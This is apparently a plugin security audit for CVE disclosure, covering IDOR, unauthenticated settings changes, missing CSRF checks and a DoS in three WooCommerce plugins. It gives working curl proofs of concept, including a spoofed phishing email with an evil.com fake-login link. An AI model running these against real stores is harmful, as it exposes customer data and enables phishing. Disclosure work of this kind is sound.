# WooCommerce Plugin Audit — Guest Order IDOR & Nopriv Settings Modification (2026-08-12)

## Scope

Deep audit of 3 WooCommerce plugins for Patchstack CVE submission:
- **WPFunnels** (wpfunnels) v2.4.0 — ~5,000 installs — 8 nopriv handlers
- **Woo Gift Cards Lite** (woo-gift-cards-lite) v3.2.9 — ~7,000 installs — 9 nopriv handlers
- **Woo Refund and Exchange Lite** (woo-refund-and-exchange-lite) v4.6.3 — ~2,000 installs — 8 nopriv handlers

## Finding 1: Guest Order IDOR via `get_current_user_id() === $order->get_user_id()`

**Plugin:** woo-refund-and-exchange-lite
**File:** `common/class-woo-refund-and-exchange-lite-common.php`
**Severity:** CRITICAL

### The Bug

Multiple nopriv AJAX handlers check order ownership with:

```php
$user_id = $order->get_user_id();
$user = wp_get_current_user();
$allowed_roles = array('administrator', 'shop_manager');
if ( get_current_user_id() === $user_id || array_intersect( $allowed_roles, $user->roles ) ) {
    // Access granted
}
```

For **guest orders** (orders placed without a WordPress account), `$order->get_user_id()` returns `0`. For unauthenticated visitors, `get_current_user_id()` also returns `0`. Therefore `0 === 0` evaluates to `true`, granting access to any guest order.

### Affected Handlers

| Handler | File:Line | Impact |
|---------|-----------|--------|
| `wps_rma_fetch_order_msgs_callback` | common.php:753 | Read all order messages for any guest order (IDOR) |
| `wps_rma_send_order_msg_callback` | common.php:798 | Send messages on any guest order, including spoofing "Shop Manager" sender to customer's billing email |
| `wps_rma_order_return_attach_files` | common.php:232 | Upload files (png/jpeg/mp4) to any guest order's return request |
| `wps_rma_cancel_return_request_callback` | common.php:721 | Cancel return requests for any guest order |

### PoC (Read Guest Order Messages)

```bash
# Get nonce from the view-order-message page (publicly accessible)
NONCE=$(curl -s 'https://target.com/view-order-msg/' | grep -oP 'wps_rma_react_nonce":"\K[^"]+')

curl -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=wps_rma_fetch_order_msgs' \
  -d "nonce=$NONCE" \
  -d 'order_id=123'
```

### PoC (Spoof Message as Shop Manager to Customer)

```bash
curl -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=wps_rma_send_order_msg' \
  -d "nonce=$NONCE" \
  -d 'order_id=123' \
  -d 'msg=Your refund has been denied. Contact us at attacker@evil.com' \
  -d 'order_msg_type=shop_manager'
```

The `order_msg_type=shop_manager` triggers an email to `$order->get_billing_email()` — the customer's real email — with the attacker's message content. This is phishing enablement.

### Nonce Accessibility

The `ajax-nonce` is created via `wp_create_nonce('ajax-nonce')` and exposed to unauthenticated users through `wp_localize_script()` on the publicly accessible "View Order Message" page (line 136 of `class-woo-refund-and-exchange-lite-common.php`). The script is enqueued when `is_page($wps_rma_view_order_msg_page_id)` is true (line 107), which is a public page.

**Two nonces are available on the same page:**
- `wps_rma_react_nonce` (action: `ajax-nonce`) — used by `save_settings_filter`, `fetch_order_msgs`, `send_order_msg`
- `wps_rma_nonce` (action: `wps_rma_ajax_security`) — used by `cancel_return_request`, `return_upload_files`

## Finding 2: Nopriv Settings Modification (No Capability Check)

**Plugin:** woo-refund-and-exchange-lite
**File:** `common/class-woo-refund-and-exchange-lite-common.php:640`
**Handler:** `wps_rma_standard_save_settings_filter`
**Severity:** CRITICAL

### The Bug

The handler is registered as BOTH `wp_ajax_` and `wp_ajax_nopriv_` (lines 355-356 of `class-woo-refund-and-exchange-lite.php`). It only checks `check_ajax_referer('ajax-nonce', 'nonce')` with NO `current_user_can()` or capability check.

The nonce `ajax-nonce` is exposed to unauthenticated users on the "View Order Message" page (same nonce as Finding 1).

### What an Attacker Can Do

```php
update_option('wps_rma_refund_enable', 'on');     // Enable refund
update_option('wps_rma_exchange_enable', 'on');   // Enable exchange
update_option('wps_rma_cancel_enable', 'on');     // Enable cancel
update_option('wps_rma_wallet_enable', 'on');     // Enable wallet
update_option('wps_rma_hide_rec', 'on');           // Hide COD
update_option('wrael_enable_tracking', 'on');      // Enable tracking
wps_rma_license_activate($license_code);          // Activate a license code (PRO only)
```

### PoC

```bash
NONCE=$(curl -s 'https://target.com/view-order-msg/' | grep -oP 'wps_rma_react_nonce":"\K[^"]+')

curl -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=wps_standard_save_settings_filter' \
  -d "nonce=$NONCE" \
  -d 'checkedRefund=true' \
  -d 'checkedExchange=true' \
  -d 'checkedCancel=true' \
  -d 'checkedWallet=true'
```

### Key Distinction from "Nonce Faucet" Pattern

This is NOT the "nonce faucet" pattern (where nopriv nonce issuance is by design for guest-access features). Here the handler modifies **site configuration** via `update_option()`, which should require admin capability. The nonce is a CSRF defense, not an authorization gate — but the missing `current_user_can()` check means the CSRF token is the ONLY barrier, and it's publicly available.

## Finding 3: Cart Manipulation Without Nonce or Capability Check

**Plugin:** wpfunnels
**File:** `public/modules/checkout/class-wpfnl-checkout.php`
**Severity:** Medium-High

### The Bug

All 4 nopriv checkout AJAX handlers have ZERO nonce verification and ZERO capability checks:

| Handler | Line | Impact |
|---------|------|--------|
| `wpfnl_next_button_ajax` | 607 | Returns next step URL (funnel structure disclosure) |
| `wpfnl_update_variation` | 685 | Modifies WC cart (add/remove products, change quantities) |
| `wpfnl_order_bump_ajax` | 730 | Adds/removes order bump products to cart |
| `wpfnl_checkout_cart` | 951 | Modifies cart quantities directly |

### PoC (Cart Quantity Manipulation)

```bash
curl -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=wpfnl_checkout_cart' \
  -d 'post_data=cart[abc123][qty]=999'
```

### Exploitability Note

These handlers manipulate `WC()->cart`, which requires an active WooCommerce session. The attacker and victim must share a session (same browser cookies), which limits remote exploitation. However, any unauthenticated user who loads a checkout page can manipulate their own cart without any CSRF protection, and if they can trick an authenticated user into visiting a page with malicious JS, the missing nonce means the CSRF attack succeeds.

## Finding 4: Gift Card Balance Check — Info Disclosure

**Plugin:** woo-gift-cards-lite
**File:** `public/class-woocommerce-gift-cards-lite-public.php:2706`
**Handler:** `wps_uwgc_check_gift_balance_org`
**Severity:** Medium

### The Bug

The handler checks `check_ajax_referer('wps-wgc-verify-nonce-check', 'wps_wgm_nonce_check')` with a nonce exposed via `wp_localize_script()` on public pages. It then verifies that the submitted email matches the gift card recipient email, and if so, reveals the full gift card balance.

### PoC

```bash
NONCE=$(curl -s 'https://target.com/check-balance/' | grep -oP 'wps_nonce_check":"\K[^"]+')

curl -X POST 'https://target.com/wp-admin/admin-ajax.php' \
  -d 'action=wps_uwgc_check_gift_balance_org' \
  -d "wps_wgm_nonce_check=$NONCE" \
  -d 'email=victim@example.com' \
  -d 'coupon=GIFT123ABC'
```

## Verified Exploit Chain — woo-refund-and-exchange-lite (2026-08-12)

Full step-by-step exploit verified on live lab with DB-level proof. All 6 endpoints confirmed:

### Step 1: Get Nonces (no auth)

```bash
NONCE1=$(curl -s http://TARGET/view-order-msg/ | grep -oP 'wps_rma_react_nonce":"\K[a-f0-9]{10}')
NONCE2=$(curl -s http://TARGET/view-order-msg/ | grep -oP 'wps_rma_nonce":"\K[a-f0-9]{10}' | head -1)
```

### Step 2: Settings Modification → "yes" ✅

```bash
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -d "action=wps_standard_save_settings_filter&nonce=$NONCE1&checkedRefund=true&checkedOrderMsg=true&consetCheck=true"
# Response: "yes"
```

### Step 3: IDOR — Read Guest Order Messages ✅

```bash
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -d "action=wps_rma_fetch_order_msgs&nonce=$NONCE1&order_id=100"
# Response: [{"1786530393":{"sender":"Shop Manager","msg":"<a href=\"http://evil.com/fake-login\">...","files":[]}}]
```

### Step 4: Email Injection — Phishing to Customer ✅

```bash
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -d "action=wps_rma_send_order_msg&nonce=$NONCE1&order_id=100" \
  --data-urlencode 'msg=<a href="http://evil.com/fake-login"><strong>URGENT:</strong> Verify your account.</a>' \
  -d 'order_msg_type=shop_manager'
# Response: {"status":200} — email sent to customer's billing email
# Email subject: "Your [Site Name] order #100 message from [date]" — appears legitimate
```

### Step 5: Cancel Refund Request — DB-Verified ✅

```bash
# DB BEFORE: "status";s:7:"pending"
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -d "action=wps_rma_cancel_return_request&security_check=$NONCE2&order_id=100"
# Response: {"response":"success"}
# DB AFTER:  "status";s:6:"cancel" + "cancel_date";i:1786553690
```

### Step 6: File Upload to Server ✅

```bash
echo -ne '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > /tmp/poc.jpg
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -F "action=wps_rma_return_upload_files" \
  -F "security_check=$NONCE2" \
  -F "wps_rma_return_request_order=100" \
  -F "wps_rma_return_request_files[0]=@/tmp/poc.jpg;filename=poc_test.jpg;type=image/jpeg"
# Response: success
```

### Step 7: Onboarding Skip (NO NONCE NEEDED) ✅

```bash
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php -d 'action=wrael_skip_onboarding_popup'
# Response: "true" — no nonce, no auth, no cookies needed
```

### Creating Test Guest Orders via Direct SQL (HPOS)

When testing guest order IDOR exploits, you need a real guest order in the database. WooCommerce HPOS (Custom Order Tables) stores orders in `wp_wc_orders` + `wp_wc_orders_meta`.

**CRITICAL: Just inserting into `wp_wc_orders` is NOT enough.** `wc_get_order()` may return `false` if there's no corresponding `wp_posts` entry (CPT compatibility). You need BOTH:

```sql
-- 1. Insert into wp_wc_orders (HPOS table)
INSERT INTO wp_wc_orders (id, status, type, total_amount, currency, customer_id, 
  billing_email, billing_first_name, billing_last_name, billing_phone, 
  date_created_gmt, date_updated_gmt, payment_method, payment_method_title)
VALUES (100, 'wc-completed', 'shop_order', 99.00, 'USD', 0, 
  'victim@example.com', 'Test', 'Customer', '5551234567',
  NOW(), NOW(), 'bacs', 'Direct Bank Transfer');

-- 2. Insert into wp_posts (CPT compatibility)
INSERT INTO wp_posts (ID, post_author, post_date, post_date_gmt, post_status, post_type, 
  post_title, post_content, post_excerpt, comment_status, ping_status, post_name, 
  post_modified, post_modified_gmt)
VALUES (100, 0, NOW(), UTC_TIMESTAMP(), 'wc-completed', 'shop_order', 
  'Order - August 12, 2026', '', '', 'open', 'closed', 'order-100',
  NOW(), UTC_TIMESTAMP());

-- 3. Add CPT meta
INSERT IGNORE INTO wp_postmeta (post_id, meta_key, meta_value) VALUES 
  (100, '_billing_email', 'victim@example.com'),
  (100, '_customer_user', '0'),
  (100, '_order_total', '99.00');
```

**Adding return request meta for cancel-refund testing** — must use proper PHP serialized format with quoted keys:

```sql
-- Write to a file FIRST, then pipe to mysql — see pitfall below
-- /tmp/fix_meta.sql:
UPDATE wp_wc_orders_meta SET meta_value = 'a:1:{i:1786500000;a:3:{s:8:"products";a:1:{i:0;a:5:{s:7:"item_id";i:1;s:10:"product_id";i:5;s:12:"variation_id";i:0;s:3:"qty";s:1:"1";s:5:"price";s:6:"299.99";}}s:6:"status";s:7:"pending";s:11:"cancel_date";N;}}' WHERE order_id=100 AND meta_key='wps_rma_return_product';
```

**`mysql -e` quote-stripping pitfall:** When using `mysql -e "INSERT..."` from the command line, double quotes inside PHP serialized data (`s:8:"products"`) get stripped to (`s:8:products`). PHP's `unserialize()` then fails silently. **Always write SQL containing PHP serialized data to a file first, then use `mysql < file.sql`** — the file-based approach preserves quotes correctly.

### Fatal Error DoS Pattern

When `wc_get_order($order_id)` returns `false` (non-existent order), and the handler calls `$order->get_billing_email()` BEFORE the ownership check, PHP throws a fatal error:

```
Response: <p>There has been a critical error on this website.</p>
```

This is a per-request DoS (site keeps working for other requests). The handler code pattern:
```php
$order = wc_get_order($order_id);  // returns false for invalid ID
if ('shop_manager' === $msg_type) {
    $to = $order->get_billing_email();  // FATAL: method on false
}
// ownership check comes AFTER — too late
```

## REST API Analysis

### woo-gift-cards-lite REST API

Three REST routes registered in `includes/giftcard-redeem-api-addon.php`:
- `/gifting/redeem-giftcard` (POST)
- `/gifting/get-giftcard` (POST)
- `/gifting/recharge-giftcard` (POST)

All use `permission_callback => 'wps_permission_check'` which requires valid API keys (consumer-key + consumer-secret headers). NOT exploitable by unauthenticated users.

### woo-refund-and-exchange-lite REST API

Three REST routes registered in `package/rest-api/class-woo-refund-and-exchange-lite-rest-api.php`:
- `/rma/refund-request` (POST)
- `/rma/refund-request-accept` (POST)
- `/rma/refund-request-cancel` (POST)

All use `permission_callback => 'wps_rma_default_permission_check'` which checks `wps_rma_secret_key` option against the request's `secret_key` parameter AND requires `wps_rma_enable_api` to be 'on'. NOT exploitable unless API is enabled and secret key is known.

### wpfunnels REST API

All REST routes use `Wpfnl_functions::wpfnl_rest_check_manager_permissions()` which checks `current_user_can('manage_options')`. NOT exploitable by unauthenticated/subscriber/customer users.

## Summary

| # | Plugin | Vuln Type | File:Line | Unauth | Severity |
|---|--------|-----------|-----------|--------|----------|
| 1 | woo-refund-and-exchange-lite | Settings Modification (no capability check) | common.php:640 | YES | Critical |
| 2 | woo-refund-and-exchange-lite | IDOR Guest Order Messages (read/write) | common.php:753,798 | YES | High |
| 3 | woo-refund-and-exchange-lite | IDOR Guest Order File Upload | common.php:232 | YES | Medium-High |
| 4 | woo-refund-and-exchange-lite | IDOR Guest Order Return Cancellation | common.php:721 | YES | Medium |
| 5 | woo-refund-and-exchange-lite | Onboarding Skip (no nonce, no auth) | onboarding.php:128 | YES | Low |
| 6 | woo-refund-and-exchange-lite | Fatal Error DoS (method on false) | common.php:804 | YES | Low |
| 7 | wpfunnels | Missing CSRF on All Checkout Handlers | checkout.php:607,685,730,951 | YES | Medium-High |
| 8 | woo-gift-cards-lite | Gift Card Balance Info Disclosure | public.php:2706 | YES | Medium |
